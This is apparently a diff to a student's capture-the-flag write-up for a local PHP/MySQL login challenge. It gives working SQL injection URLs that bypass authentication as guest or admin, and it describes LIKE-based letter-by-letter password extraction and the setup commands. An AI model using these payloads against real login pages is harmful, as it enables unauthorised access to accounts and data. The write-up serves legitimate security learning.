@@ -21,22 +21,13 @@ Success or Failure
 
 Can you ask the right questions????
 -----------------------------------------------------------------------------------
+
 The login mechanism accepts a password  (pw) from the URL and embeds it directly into an SQL query.
 The input is not safely handled, and SQL injection can be conducted. 
 
-starting mysql,
-sudo systemctl start mysql
-sudo systemctl status mysql
-
-log in to mysql ,  sudo mysql
-
-start php server,
-php -S 127.0.0.1:8000
-
-challege page link ,  http://127.0.0.1:8000/sample.php
-
 checking if injection is possible , 
-http://127.0.0.1:8000/sample.php?pw='       , must show error
+http://127.0.0.1:8000/sample.php?pw='       , must show error as it terminate the string
+As the input is directly entered into the query, the SQL syntax break.
 admin login , http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%23
 
 
@@ -44,6 +35,7 @@ use the link , http://127.0.0.1:8000/sample.php?pw=%27||1=1%23 , to login as gue
 
 use link , http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%23 , to login as admin
 
+How the password is checked: id='admin' AND pw='<user_input>'
 Finding password letter by letter
 
 LIKE "s%"  , checks if s is the first character,  % denote anything after s.
@@ -84,3 +76,15 @@ shows CHALLENGE CLEARED!! Hello admin !!
 
 flag{supersecret}
 
+
+
+Steps
+starting mysql,
+sudo systemctl start mysql
+sudo systemctl status mysql
+log in to mysql ,  sudo mysql
+start php server,
+php -S 127.0.0.1:8000
+
+challege page link ,  http://127.0.0.1:8000/sample.php
+Now, inject the different letters to find the password.
